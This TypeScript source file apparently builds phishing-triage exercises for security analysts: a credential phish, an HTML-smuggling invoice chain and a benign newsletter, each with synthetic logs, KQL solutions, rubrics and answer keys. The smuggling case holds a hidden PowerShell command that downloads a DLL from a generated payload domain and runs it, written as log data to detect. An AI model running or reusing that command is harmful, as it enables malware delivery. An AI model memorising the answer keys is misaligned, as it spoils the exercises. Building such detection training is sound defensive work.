// Phishing & email scenarios. Twin: a reported credential-phish vs. a
// reported newsletter — identical alert, opposite answer, decided by
// authentication alignment, domain age and what happened after delivery.
import type { CaseTemplate } from '../model.ts';
import type { Person } from '../../world/world.ts';
import { HOUR, MIN, SEC } from '../../logs/time.ts';
import type { RowRef } from '../../logs/corpus.ts';
import { BULK_SENDERS, registeredDomain } from '../../synth/domains.ts';
import { BIN, binaryHash } from '../../synth/software.ts';
import { userAgentOf } from '../../logs/noise/presence.ts';
import { mfaDetail } from '../../logs/noise/identity.ts';
import { domain, host, ip, kdt, rubric, sha, technique, user } from './util.ts';

function msgId(rng: { hex(n: number): string }): string {
  return `${rng.hex(8)}-${rng.hex(4)}-${rng.hex(4)}-${rng.hex(4)}-${rng.hex(12)}`;
}

function emailPreview(h: [string, string][], body: string[]): string {
  const width = Math.max(...h.map(([k]) => k.length));
  return [...h.map(([k, v]) => `${(k + ':').padEnd(width + 2)}${v}`), '', ...body].join('\n');
}

// ---------------------------------------------------------------------------
// Credential-harvesting phish, clicked and submitted (TRUE POSITIVE)
// ---------------------------------------------------------------------------
const credentialPhish: CaseTemplate = {
  id: 'email-phish-credential',
  category: 'phishing',
  difficulty: 'tier1',
  title: 'User-reported email',
  lesson: 'Credential phish: submitted, then tried from abroad',
  cysaDomains: ['1.0', '3.0'],
  tactics: ['initial-access', 'execution'],
  kind: 'incident',
  twin: 'email-benign-marketing',
  stages: ['initial-access'],
  when: 'business',
  build(ctx) {
    const { rng, log, pick, idx, at, world } = ctx;
    const victim = ctx.foothold?.personId ? idx.person(ctx.foothold.personId) : pick.person({ dept: ['Finance', 'Sales', 'Operations', 'Marketing', 'HR', 'Legal'], windows: true });
    const others = pick.people(rng.int(3, 7), { exclude: [victim] });
    const lure = ctx.infra.domain('phish', { ageDays: rng.int(2, 6) });
    const lureIp = ctx.infra.ip('phish');
    const sender = `no-reply@${lure}`;
    const subject = rng.pick(['[Action Required] Your password expires today', 'Mailbox storage full — verify to keep receiving mail', 'Unusual sign-in blocked — confirm your identity']);
    const link = `https://${lure}/owa/login?u=${victim.sam}`;
    const tSend = at - rng.int(40, 70) * MIN;
    const id = msgId(rng);
    const senderIp = ctx.infra.ip('sender');
    const mails = [victim, ...others].map((p, i) =>
      log.email({
        TimeGenerated: tSend + i * rng.int(1, 4) * SEC, NetworkMessageId: id, SenderFromAddress: sender, SenderDisplayName: 'Microsoft 365 Security', SenderMailFromDomain: lure, SenderIPv4: senderIp,
        RecipientEmailAddress: p.upn, Subject: subject, EmailDirection: 'Inbound', DeliveryAction: 'Delivered', DeliveryLocation: 'Inbox', SPF: 'pass', DKIM: 'pass', DMARC: 'pass', BulkComplaintLevel: 0,
        Urls: `https://${lure}/owa/login?u=${p.sam}`, AttachmentNames: '', ThreatTypes: '',
        PostDeliveryAction: p === victim ? 'User reported: phish' : '', PostDeliveryTime: p === victim ? at - rng.int(1, 3) * MIN : null,
      }),
    );
    const w = pick.where(victim, at - 20 * MIN);
    const tClick = tSend + rng.int(12, 30) * MIN;
    log.dns({ TimeGenerated: tClick - 2 * SEC, ClientIP: w.lanIp, Computer: 'DC01', Name: lure });
    const get = log.proxy({ TimeGenerated: tClick, SourceIP: w.lanIp, SourceUser: victim.sam, Method: 'GET', Url: link, DestinationHost: lure, DestinationIP: lureIp, StatusCode: 200, BytesSent: rng.int(600, 900), BytesReceived: rng.int(38_000, 61_000), Category: 'Newly Registered Domain', UserAgent: userAgentOf(victim) });
    const post = log.proxy({ TimeGenerated: tClick + rng.int(25, 70) * SEC, SourceIP: w.lanIp, SourceUser: victim.sam, Method: 'POST', Url: `https://${lure}/owa/auth.php`, DestinationHost: lure, DestinationIP: lureIp, StatusCode: 302, BytesSent: rng.int(380, 460), BytesReceived: rng.int(300, 600), Category: 'Newly Registered Domain', UserAgent: userAgentOf(victim) });
    const intel = log.domainIntelRef(lure);
    // The harvested password is tried minutes later; MFA holds (for now).
    const login = ctx.infra.ip('login', pick.city({ farFrom: idx.siteOf(victim).city, minKm: 2000 }));
    const tryAt = tClick + rng.int(6, 14) * MIN;
    const tries = [0, 1].map((k) =>
      log.signin({
        TimeGenerated: tryAt + k * rng.int(30, 90) * SEC, UserPrincipalName: victim.upn, AppDisplayName: 'OfficeHome', ClientAppUsed: 'Browser', IPAddress: login, ResultType: k === 0 ? 50074 : 500121,
        AuthenticationRequirement: 'multiFactorAuthentication', MfaDetail: mfaDetail(victim.mfaMethod), MfaResult: k === 0 ? '' : 'MFA denied; user did not respond to mobile app notification', ConditionalAccessStatus: 'notApplied',
        IncomingTokenType: 'none', DeviceId: '', DeviceName: '', IsCompliant: false, IsManaged: false, OperatingSystem: 'Linux', Browser: 'Chrome 124.0.0', UserAgent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', RiskLevelDuringSignIn: 'high',
      }),
    );

    return {
      alert: {
        rule: 'Email reported by user as malware or phish',
        product: 'Microsoft Defender for Office 365',
        severity: 'informational',
        time: at,
        summary: `${victim.upn} reported "${subject}" from ${sender}.`,
        entities: [
          { kind: 'user', value: victim.upn, label: victim.display },
          { kind: 'email', value: sender, label: 'Sender' },
        ],
        fields: [['Delivery', 'Inbox (gateway verdict: none)'], ['Reported', 'Via Report Phish button']],
      },
      briefing: `${world.org.name} uses Microsoft 365 mail behind the Defender gateway, with a web proxy for all corporate devices. Users are encouraged to report anything suspicious.`,
      attachments: [
        {
          title: 'Reported message',
          kind: 'email',
          body: emailPreview(
            [
              ['From', `"Microsoft 365 Security" <${sender}>`],
              ['To', victim.upn],
              ['Subject', subject],
              ['Return-Path', `bounce@${lure}`],
              ['Authentication-Results', `spf=pass smtp.mailfrom=${lure}; dkim=pass header.d=${lure}; dmarc=pass header.from=${lure}`],
            ],
            [
              'Your Microsoft 365 password expires in 2 hours. To keep your current',
              'password, verify your identity now or your mailbox will be suspended.',
              '',
              `    [ Keep My Password ]  -> ${link.replace('https://', 'hxxps://').replace(/\./g, '[.]')}`,
              '',
              'Microsoft 365 Security Team',
            ],
          ),
          caption: 'As the user saw it. Links defanged.',
        },
      ],
      truth: { disposition: 'true-positive', severity: 'high', action: 'escalate', techniques: ['T1566.002', 'T1204.001'], tactics: ['initial-access', 'execution'], alsoAccept: ['T1598.003', 'T1078.004', 'T1621'] },
      evidence: [
        { id: 'alignment', label: `Authentication "passes" only for the attacker's own domain ${lure}, registered days ago`, why: 'SPF/DKIM/DMARC prove the mail came from the domain in the From header — here that domain is the attacker’s. The brand is only in the display name.', rows: [mails[0], intel] },
        { id: 'submitted', label: `${victim.first} opened the page and then POSTed to it — credentials submitted`, why: 'A GET is a click. A POST to the login handler is a credential submission.', rows: [post, get] },
        { id: 'used', label: 'The harvested password was tried from abroad minutes later', why: 'Password confirmed stolen — MFA stopped this attempt, but the attacker will try again (push bombing, token theft).', rows: tries },
        { id: 'reach', label: `${others.length} other users received the same message`, why: 'The campaign is wider than the reporter: purge it everywhere and check who else clicked.', rows: mails.slice(1) },
      ],
      indicators: {
        block: [domain(lure, 'Phishing domain'), { kind: 'email', value: sender }, ip(lureIp, 'Phishing site'), ip(login, 'Attacker login attempts')],
        scope: [user(victim)],
        mustNot: [domain('microsoft.com'), domain('office365.com'), ip(w.cloudIp, "User's egress")],
      },
      hints: [
        'Did the "pass" results authenticate Microsoft — or someone else? Then: did the user just click, or go further?',
        `EmailEvents | where SenderFromDomain == "${lure}" | project TimeGenerated, RecipientEmailAddress, SPF, DKIM, DMARC, DeliveryAction`,
        `WebProxy | where DestinationHost == "${lure}" | project TimeGenerated, SourceUser, Method, Url, StatusCode`,
      ],
      solution: [
        { title: 'Who got it, and did auth really pass?', kql: `EmailEvents\n| where SenderFromDomain == "${lure}"\n| project TimeGenerated, RecipientEmailAddress, SenderDisplayName, SPF, DKIM, DMARC, DeliveryAction, PostDeliveryAction`, why: `All pass — for ${lure}. ${others.length + 1} recipients, all delivered.` },
        { title: 'How old is the sending domain?', kql: `DomainIntel\n| where Domain == "${registeredDomain(lure)}"`, why: 'Registered days ago.' },
        { title: 'Who clicked, and what did they send?', kql: `WebProxy\n| where DestinationHost == "${lure}"\n| project TimeGenerated, SourceUser, Method, Url, DestinationIP, StatusCode, BytesSent`, why: 'GET then POST from the reporter: credentials submitted.' },
        { title: 'Was the password used?', kql: `SigninLogs\n| where UserPrincipalName == "${victim.upn}" and ResultType != 0\n| project TimeGenerated, IPAddress, City, ResultType, MfaResult`, why: 'Tried from abroad within minutes; stopped at MFA.' },
      ],
      rubric: rubric([
        ['alignment', `SPF/DKIM/DMARC "pass" for ${lure}, not microsoft.com — the brand is only in the display name.`, ['spf', 'dkim', 'dmarc', 'alignment', 'display name', 'not microsoft']],
        ['newdomain', 'The sending domain is newly registered and impersonates a brand.', ['newly registered', 'domain age', 'new domain', 'impersonat', 'lookalike', 'days old']],
        ['submitted', 'The proxy POST to the login handler means credentials were submitted.', ['post', 'submitted', 'credentials', 'entered', 'harvest']],
        ['used', 'The stolen password was already tried from abroad — MFA held this time.', ['sign-in attempt', 'tried', 'mfa', 'stolen password', 'attempt']],
        ['contain', 'Reset and revoke for the reporter, block the domain and IPs, purge the message from all mailboxes, check other recipients.', ['reset', 'revoke', 'block', 'purge', 'other recipients']],
      ]),
      explanation: [
        `Passing SPF, DKIM and DMARC does not mean "legitimate" — those checks pass for whatever domain actually sent the mail. Here that is ${lure}, registered days ago; "Microsoft 365 Security" is only the display name. This is the single most common way analysts wrongly clear phishing.`,
        `${victim.first} did more than click: the proxy shows a GET of the fake Outlook page and then a POST to its login handler — the credentials were submitted. Minutes later the password was tried from ${ctx.log.geo[login]?.city ?? 'abroad'} (${login}); MFA stopped it this time. The same message landed in ${others.length} other inboxes.`,
        `Treat ${victim.first} as compromised: reset the password, revoke sessions, and watch for push bombing. Block ${lure} and its IPs, purge the message org-wide, and check whether any other recipient visited the site. The reporter did exactly the right thing — say so.`,
      ],
      pitfalls: [
        'SPF/DKIM/DMARC "pass" is about the sending domain, not the impersonated brand — check alignment against the From domain.',
        'A GET to the phishing page is a click; a POST is a credential submission. The POST changes the severity.',
        'MFA stopping the first attempt is not the end — the attacker has the password and will try again.',
      ],
      references: [technique('T1566.002'), { label: 'DMARC alignment overview', url: 'https://dmarc.org/overview/' }],
    };
  },
};

// ---------------------------------------------------------------------------
// HTML-smuggling invoice campaign; one recipient opened it (TRUE POSITIVE)
// ---------------------------------------------------------------------------
const attachmentPhish: CaseTemplate = {
  id: 'email-phish-attachment',
  category: 'phishing',
  difficulty: 'tier2',
  title: 'Attachment removed after delivery',
  lesson: 'HTML-smuggling invoice opened before ZAP',
  cysaDomains: ['1.0', '3.0'],
  tactics: ['initial-access', 'execution'],
  kind: 'incident',
  stages: ['initial-access'],
  when: 'business',
  build(ctx) {
    const { rng, log, pick, idx, at, world } = ctx;
    const finance = world.people.filter((p) => p.department === 'Finance');
    const opener: Person = ctx.foothold?.personId ? idx.person(ctx.foothold.personId) : rng.pick(finance.filter((p) => idx.deviceOf(p).os.startsWith('Windows')));
    const sendDomain = ctx.infra.domain('sender', { style: 'lure', ageDays: rng.int(3, 12) });
    const senderIp = ctx.infra.ip('sender');
    const payloadDomain = ctx.infra.domain('payload', { ageDays: rng.int(2, 9) });
    const payloadIp = ctx.infra.ip('payload');
    const attachHash = ctx.infra.hash('attachment');
    const n = rng.int(1000, 9999);
    const file = `Invoice_${n}.html`;
    const sender = `accounts@${sendDomain}`;
    const subject = `Overdue invoice #${rng.int(40000, 99000)} — please remit`;
    const tSend = at - rng.int(70, 110) * MIN;
    const zapAt = tSend + rng.int(20, 45) * MIN;
    const id = msgId(rng);
    const recipients = rng.shuffle(finance.filter((p) => p !== opener));
    recipients.unshift(opener);
    // First wave lands before the verdict flips; the rest of the campaign
    // arrives after it and is blocked at the gateway.
    const firstWave = Math.max(2, Math.ceil(recipients.length / 2));
    const delivered: RowRef<'EmailEvents'>[] = [];
    const arrivals = new Map<string, number>();
    recipients.forEach((p, i) => {
      const early = i < firstWave;
      const t = early ? tSend + i * rng.int(20, 90) * SEC : zapAt + rng.int(5, 25) * MIN + i * rng.int(10, 60) * SEC;
      arrivals.set(p.id, t);
      const row = log.email({
        TimeGenerated: t, NetworkMessageId: id, SenderFromAddress: sender, SenderDisplayName: 'Accounts Receivable', SenderMailFromDomain: sendDomain, SenderIPv4: senderIp, RecipientEmailAddress: p.upn, Subject: subject,
        EmailDirection: 'Inbound', DeliveryAction: early ? 'Delivered' : 'Blocked', DeliveryLocation: early ? 'Inbox' : 'Quarantine', SPF: 'pass', DKIM: 'none', DMARC: 'pass', BulkComplaintLevel: 1, Urls: '',
        AttachmentNames: file, AttachmentSHA256: attachHash, ThreatTypes: early ? '' : 'Malware', PostDeliveryAction: early ? 'ZAP: moved to quarantine (retro verdict: Malware)' : '', PostDeliveryTime: early ? zapAt : null,
      });
      if (early) delivered.push(row);
    });
    // One recipient opened it before ZAP.
    const dev = idx.deviceOf(opener);
    const w = pick.where(opener, zapAt - 10 * MIN);
    const tOpen = arrivals.get(opener.id)! + rng.int(4, Math.max(5, Math.floor((zapAt - arrivals.get(opener.id)!) / MIN) - 3)) * MIN;
    const cache = `C:\\Users\\${opener.sam}\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\${rng.alnum(8).toUpperCase()}`;
    const iso = `Invoice_${n}.iso`;
    const isoHash = ctx.infra.hash('payload');
    const loaderHash = ctx.infra.hash('loader');
    const htmlFile = log.file({ TimeGenerated: tOpen, DeviceName: dev.name, ActionType: 'FileCreated', FileName: file, FolderPath: `${cache}\\${file}`, FileSize: rng.int(180_000, 420_000), SHA256: attachHash, InitiatingProcessFileName: 'outlook.exe', InitiatingProcessAccountName: opener.sam });
    const browser = log.proc({ TimeGenerated: tOpen + 3 * SEC, DeviceName: dev.name, AccountName: opener.sam, FileName: 'msedge.exe', FolderPath: BIN.msedge.path, ProcessCommandLine: `"${BIN.msedge.path}" --single-argument ${cache}\\${file}`, SHA256: binaryHash('msedge.exe'), Signer: BIN.msedge.signer, ProcessIntegrityLevel: 'Medium', InitiatingProcessFileName: 'outlook.exe', InitiatingProcessCommandLine: `"${BIN.outlook.path}"` });
    const isoDrop = log.file({ TimeGenerated: tOpen + rng.int(4, 9) * SEC, DeviceName: dev.name, ActionType: 'FileCreated', FileName: iso, FolderPath: `C:\\Users\\${opener.sam}\\Downloads\\${iso}`, FileSize: rng.int(900_000, 2_400_000), SHA256: isoHash, InitiatingProcessFileName: 'msedge.exe', InitiatingProcessAccountName: opener.sam });
    const tRun = tOpen + rng.int(40, 120) * SEC;
    const dlPath = `/i/${rng.alnum(6)}`;
    const ps = log.proc({ TimeGenerated: tRun, DeviceName: dev.name, AccountName: opener.sam, FileName: 'powershell.exe', FolderPath: BIN.powershell.path, ProcessCommandLine: `powershell.exe -nop -w hidden -c "iwr https://${payloadDomain}${dlPath} -OutFile $env:TEMP\\u.dll; rundll32 $env:TEMP\\u.dll,Start"`, SHA256: binaryHash('powershell.exe'), Signer: BIN.powershell.signer, ProcessIntegrityLevel: 'Medium', InitiatingProcessFileName: 'explorer.exe', InitiatingProcessCommandLine: `E:\\Invoice_${n}.lnk` });
    const dll = log.file({ TimeGenerated: tRun + 4 * SEC, DeviceName: dev.name, ActionType: 'FileCreated', FileName: 'u.dll', FolderPath: `C:\\Users\\${opener.sam}\\AppData\\Local\\Temp\\u.dll`, FileSize: rng.int(300_000, 800_000), SHA256: loaderHash, InitiatingProcessFileName: 'powershell.exe', InitiatingProcessAccountName: opener.sam });
    const rundll = log.proc({ TimeGenerated: tRun + 6 * SEC, DeviceName: dev.name, AccountName: opener.sam, FileName: 'rundll32.exe', FolderPath: BIN.rundll32.path, ProcessCommandLine: `rundll32 C:\\Users\\${opener.sam}\\AppData\\Local\\Temp\\u.dll,Start`, SHA256: binaryHash('rundll32.exe'), Signer: BIN.rundll32.signer, ProcessIntegrityLevel: 'Medium', InitiatingProcessFileName: 'powershell.exe', InitiatingProcessCommandLine: 'powershell.exe -nop -w hidden -c …' });
    const dl = log.proxy({ TimeGenerated: tRun + 2 * SEC, SourceIP: w.lanIp, SourceUser: opener.sam, Method: 'GET', Url: `https://${payloadDomain}${dlPath}`, DestinationHost: payloadDomain, DestinationIP: payloadIp, StatusCode: 200, BytesSent: rng.int(300, 700), BytesReceived: rng.int(300_000, 800_000), Category: 'Newly Registered Domain', UserAgent: 'Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.26100.1' });
    const beacons = Array.from({ length: rng.int(3, 6) }, (_, i) =>
      log.net({ TimeGenerated: tRun + (40 + i * rng.int(50, 70)) * SEC, DeviceName: dev.name, LocalIP: w.lanIp, RemoteIP: payloadIp, RemotePort: 443, RemoteUrl: payloadDomain, InitiatingProcessFileName: 'rundll32.exe', InitiatingProcessAccountName: opener.sam }),
    );
    const supplier = world.partners.find((p) => p.relationship === 'Supplier') ?? world.partners[0];

    return {
      alert: {
        rule: 'Email messages containing malicious file removed after delivery',
        product: 'Microsoft Defender for Office 365',
        severity: 'medium',
        time: at,
        summary: `Zero-hour auto purge (ZAP) removed ${delivered.length} delivered messages after ${file} was reclassified as malware. ${recipients.length} recipients were targeted.`,
        entities: [
          { kind: 'email', value: sender, label: 'Sender' },
          { kind: 'sha256', value: attachHash, label: file },
        ],
        fields: [['Initial verdict', 'Clean'], ['Latest verdict', 'Malware (sandbox detonation)'], ['Subject', subject]],
      },
      briefing: `${world.org.name}'s finance team receives dozens of invoices a day from suppliers such as ${supplier.org.name}. Attachment detonation is asynchronous: mail is delivered first, re-scanned later.`,
      truth: { disposition: 'true-positive', severity: 'high', action: 'escalate', techniques: ['T1566.001', 'T1204.002'], tactics: ['initial-access', 'execution'], alsoAccept: ['T1027.006', 'T1553.005', 'T1059.001', 'T1105', 'T1218.011', 'T1218', 'T1071.001'] },
      evidence: [
        { id: 'window', label: `${delivered.length} copies were delivered before the verdict flipped`, why: 'Asynchronous detonation creates a delivery window. ZAP pulled the mail — but only after people could open it.', rows: delivered },
        { id: 'opened', label: `${opener.first} opened ${file}: the browser wrote ${iso} to Downloads`, why: 'HTML smuggling: the attachment is a web page that assembles a disk image locally, sidestepping the gateway.', rows: [htmlFile, browser, isoDrop] },
        { id: 'executed', label: 'A shortcut inside the ISO launched hidden PowerShell that fetched and ran a DLL', why: 'The chain executed — this is an endpoint compromise, not just a mail incident.', rows: [ps, dll, rundll] },
        { id: 'c2', label: `The loader is talking to ${payloadDomain}`, why: 'Active command and control from a finance laptop.', rows: [dl, ...beacons] },
      ],
      indicators: {
        block: [domain(sendDomain, 'Sender domain'), { kind: 'email', value: sender }, sha(attachHash, file), sha(isoHash, iso), domain(payloadDomain, 'Payload / C2'), ip(payloadIp, 'Payload / C2'), sha(loaderHash, 'u.dll loader')],
        scope: [user(opener), host(dev.name)],
        mustNot: [domain(supplier.org.domain, 'Real supplier — also sends invoices'), host('SCCM01')],
      },
      hints: [
        'ZAP removing mail is the good news. The question is whether anyone opened it in the window before — and what their machine did next.',
        `DeviceFileEvents | where FileName == "${file}" or SHA256 == "${attachHash}"`,
        `Follow that device: DeviceProcessEvents | where DeviceName == "${dev.name}" and TimeGenerated > ${kdt(tOpen - MIN)}`,
      ],
      solution: [
        { title: 'Scope the campaign', kql: `EmailEvents\n| where SenderFromDomain == "${sendDomain}"\n| project TimeGenerated, RecipientEmailAddress, DeliveryAction, ThreatTypes, PostDeliveryAction, PostDeliveryTime`, why: `${delivered.length} delivered before the retro verdict; the later wave was blocked.` },
        { title: 'Did anyone open it?', kql: `DeviceFileEvents\n| where SHA256 == "${attachHash}" or FileName endswith ".iso"\n| project TimeGenerated, DeviceName, ActionType, FileName, FolderPath, SHA256, InitiatingProcessFileName`, why: `${opener.first}'s laptop saved the HTML and the browser produced an ISO — smuggling worked.` },
        { title: 'What ran?', kql: `DeviceProcessEvents\n| where DeviceName == "${dev.name}" and TimeGenerated between (${kdt(tOpen - MIN)} .. ${kdt(tRun + 5 * MIN)})\n| where FileName in ("msedge.exe", "powershell.exe", "rundll32.exe")\n| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine`, why: 'Browser opens the HTML; a shortcut on the mounted ISO launches hidden PowerShell; PowerShell starts rundll32 on the downloaded DLL.' },
        { title: 'The DLL on disk', kql: `DeviceFileEvents\n| where DeviceName == "${dev.name}" and FileName == "u.dll"`, why: 'Hash to block and hunt.' },
        { title: 'Is it calling home?', kql: `DeviceNetworkEvents\n| where DeviceName == "${dev.name}" and RemoteUrl == "${payloadDomain}"`, why: 'rundll32 beaconing to the payload host.' },
        { title: 'The download', kql: `WebProxy\n| where DestinationHost == "${payloadDomain}"`, why: 'A PowerShell user agent fetching the DLL.' },
      ],
      rubric: rubric([
        ['retro', 'A clean-then-malicious retro verdict means detonation lagged delivery — some mail landed.', ['retro', 'zap', 'detonation', 'delivered', 'lag', 'window']],
        ['smuggling', 'HTML smuggling → ISO → LNK → PowerShell → DLL is the delivery chain.', ['html smuggling', 'iso', 'lnk', 'powershell', 'rundll32', 'chain']],
        ['opened', `One recipient (${opener.sam}) opened it and the chain executed — endpoint compromise.`, ['opened', 'executed', opener.sam, 'infected', 'endpoint']],
        ['contain', 'Isolate the laptop, block sender/payload domains and hashes, confirm the purge, hunt the fleet for the ISO/DLL hashes.', ['isolate', 'block', 'purge', 'hunt', 'hash']],
      ]),
      explanation: [
        `Asynchronous sandboxing creates a delivery window: the gateway first scored ${file} clean and delivered it, then detonation flipped the verdict and ZAP pulled the copies. ${delivered.length} inboxes had it in the meantime — so the real question is who opened it.`,
        `${opener.first} did. The HTML attachment is an HTML-smuggling page: opened in the browser, it assembled ${iso} locally and saved it to Downloads, bypassing the gateway entirely. A shortcut inside the mounted ISO launched hidden PowerShell that downloaded a DLL from ${payloadDomain} and ran it with rundll32, which is now beaconing to ${payloadIp}. Mail purge alone would have missed this.`,
        `Escalate: isolate ${dev.name}, block the sender and payload infrastructure and all three hashes (HTML, ISO, DLL), confirm the purge, and hunt the fleet for the ISO and DLL hashes. ${opener.first}'s credentials and session should be treated as exposed.`,
      ],
      pitfalls: [
        'An initial "clean" verdict is not final when detonation is asynchronous — always look for a retro update.',
        'ZAP is not containment: check endpoints for anyone who opened the attachment before the purge.',
        `Don't block ${supplier.org.domain} — it is a real supplier that legitimately sends invoices.`,
      ],
      references: [technique('T1566.001'), technique('T1027.006'), { label: 'Zero-hour auto purge (ZAP)', url: 'https://learn.microsoft.com/defender-office-365/zero-hour-auto-purge' }],
    };
  },
};

// ---------------------------------------------------------------------------
// Benign twin: a user-reported newsletter (BENIGN)
// ---------------------------------------------------------------------------
const benignMarketing: CaseTemplate = {
  id: 'email-benign-marketing',
  category: 'phishing',
  difficulty: 'tier1',
  title: 'User-reported email',
  lesson: 'A legitimate, authenticated newsletter',
  cysaDomains: ['1.0'],
  tactics: [],
  kind: 'benign',
  twin: 'email-phish-credential',
  when: 'business',
  build(ctx) {
    const { rng, log, pick, at, world } = ctx;
    const reporter = pick.person();
    const brand = rng.pick(BULK_SENDERS);
    const subject = rng.pick(brand.subjects);
    const tSend = at - rng.int(30, 180) * MIN;
    const recipients = [reporter, ...pick.people(rng.int(6, 14), { exclude: [reporter] })];
    const id = msgId(rng);
    const senderIp = world.bulkSenderIps[brand.from];
    const mails = recipients.map((p, i) =>
      log.email({
        TimeGenerated: tSend + i * rng.int(2, 20) * SEC, NetworkMessageId: id, SenderFromAddress: brand.from, SenderDisplayName: brand.brand, SenderFromDomain: brand.fromDomain, SenderMailFromDomain: brand.esp, SenderIPv4: senderIp,
        RecipientEmailAddress: p.upn, Subject: subject, EmailDirection: 'Inbound', DeliveryAction: 'Delivered', DeliveryLocation: 'Inbox', SPF: 'pass', DKIM: 'pass', DMARC: 'pass', BulkComplaintLevel: rng.int(4, 6),
        Urls: `https://${brand.fromDomain}/`, AttachmentNames: '', ThreatTypes: '', PostDeliveryAction: p === reporter ? 'User reported: phish' : '', PostDeliveryTime: p === reporter ? at - rng.int(1, 4) * MIN : null,
      }),
    );
    // Earlier issues of the same newsletter.
    const history = Array.from({ length: rng.int(2, 4) }, () =>
      log.email({
        TimeGenerated: rng.int(ctx.log.windowStart + HOUR, tSend - HOUR), NetworkMessageId: msgId(rng), SenderFromAddress: brand.from, SenderDisplayName: brand.brand, SenderFromDomain: brand.fromDomain, SenderMailFromDomain: brand.esp, SenderIPv4: senderIp,
        RecipientEmailAddress: rng.pick(world.people).upn, Subject: rng.pick(brand.subjects), EmailDirection: 'Inbound', DeliveryAction: 'Delivered', DeliveryLocation: 'Inbox', SPF: 'pass', DKIM: 'pass', DMARC: 'pass', BulkComplaintLevel: rng.int(4, 6),
        Urls: `https://${brand.fromDomain}/`, AttachmentNames: '', ThreatTypes: '',
      }),
    );
    const intel = log.domainIntelRef(brand.fromDomain);

    return {
      alert: {
        rule: 'Email reported by user as malware or phish',
        product: 'Microsoft Defender for Office 365',
        severity: 'informational',
        time: at,
        summary: `${reporter.upn} reported "${subject}" from ${brand.from}.`,
        entities: [
          { kind: 'user', value: reporter.upn, label: reporter.display },
          { kind: 'email', value: brand.from, label: 'Sender' },
        ],
        fields: [['Delivery', 'Inbox (gateway verdict: none)'], ['Reported', 'Via Report Phish button']],
      },
      briefing: `${world.org.name} encourages everyone to report anything suspicious; most reports turn out to be false alarms, and that is fine.`,
      attachments: [
        {
          title: 'Reported message',
          kind: 'email',
          body: emailPreview(
            [
              ['From', `"${brand.brand}" <${brand.from}>`],
              ['To', reporter.upn],
              ['Subject', subject],
              ['Return-Path', `bounces@${brand.esp}`],
              ['List-Unsubscribe', `<https://${brand.fromDomain}/unsubscribe>, <mailto:unsubscribe@${brand.esp}> (one-click)`],
              ['Authentication-Results', `spf=pass smtp.mailfrom=${brand.esp}; dkim=pass header.d=${brand.fromDomain}; dmarc=pass header.from=${brand.fromDomain}`],
            ],
            ['Here is what is new this month — product updates, events and tips.', '', `    [ Read more ]  -> hxxps://${brand.fromDomain.replace(/\./g, '[.]')}/`],
          ),
          caption: 'As the user saw it. Links defanged.',
        },
      ],
      truth: { disposition: 'benign', severity: 'informational', action: 'close', techniques: [], tactics: [] },
      evidence: [
        { id: 'auth', label: `Authentication passes and aligns to ${brand.fromDomain}, the real brand`, why: 'DKIM is signed by the brand’s own domain and DMARC aligns to it — the opposite of the phishing twin.', rows: [mails[0]] },
        { id: 'reputation', label: `${brand.fromDomain} is an established domain with good reputation`, why: 'Years old, categorised, trusted.', rows: [intel] },
        { id: 'history', label: 'The same sender has mailed staff before with identical authentication', why: 'A known bulk sender with a history, not a one-off campaign.', rows: [...history, ...mails.slice(1)] },
      ],
      indicators: { block: [], scope: [], mustNot: [domain(brand.fromDomain, 'The real brand'), { kind: 'email', value: brand.from }, domain(brand.esp, 'Email service provider')] },
      hints: [
        'Check who authenticated this mail and whether it aligns with the brand in the From header. Then check the sender’s history.',
        `EmailEvents | where SenderFromAddress == "${brand.from}" | project TimeGenerated, RecipientEmailAddress, SenderMailFromDomain, SPF, DKIM, DMARC, BulkComplaintLevel`,
        `DomainIntel | where Domain == "${registeredDomain(brand.fromDomain)}"`,
      ],
      solution: [
        { title: 'Authentication and history', kql: `EmailEvents\n| where SenderFromAddress == "${brand.from}"\n| project TimeGenerated, RecipientEmailAddress, SenderFromDomain, SenderMailFromDomain, SPF, DKIM, DMARC, BulkComplaintLevel, PostDeliveryAction\n| sort by TimeGenerated asc`, why: 'All aligned to the brand; a regular bulk sender (BCL 4–6).' },
        { title: 'Domain reputation', kql: `DomainIntel\n| where Domain == "${registeredDomain(brand.fromDomain)}"`, why: 'Established, good reputation.' },
      ],
      rubric: rubric([
        ['authpass', `SPF/DKIM/DMARC pass AND align to ${brand.fromDomain} — the real brand.`, ['spf', 'dkim', 'dmarc', 'aligned', 'pass']],
        ['legitesp', 'Sent via a known ESP with one-click unsubscribe and a bulk complaint level typical of newsletters.', ['esp', 'unsubscribe', 'bulk', 'marketing', 'newsletter', 'bcl']],
        ['history', 'An established domain with a history of the same mailings to staff.', ['history', 'established', 'reputation', 'previous', 'regular']],
        ['close', 'Benign; thank the user and close (reporting culture matters).', ['benign', 'close', 'thank', 'reassure']],
      ]),
      explanation: [
        `Everything checks out: DKIM is signed by ${brand.fromDomain}, DMARC aligns to it, and SPF passes for ${brand.esp}, the email service provider the brand uses. The message carries a one-click List-Unsubscribe, no attachments, and its only link goes to the brand's own site.`,
        `Contrast the credential-phish twin, where the checks "pass" only for an attacker-owned, days-old domain and the brand lives solely in the display name. Here ${brand.fromDomain} is years old with good reputation, and the same newsletter has reached staff before with identical authentication.`,
        `Disposition benign, informational. Close it and thank ${reporter.first} — you want people reporting, even when it is a false alarm. If this sender draws lots of reports, a note in the phishing-awareness FAQ is reasonable.`,
      ],
      pitfalls: [
        'Do not reflexively treat every reported email as malicious — clearing false alarms well is core Tier 1 work.',
        'Never discourage reporting; a thank-you on a benign close reinforces the behaviour you want.',
      ],
      references: [{ label: 'DMARC alignment overview', url: 'https://dmarc.org/overview/' }],
    };
  },
};

export const emailTemplates: CaseTemplate[] = [credentialPhish, attachmentPhish, benignMarketing];
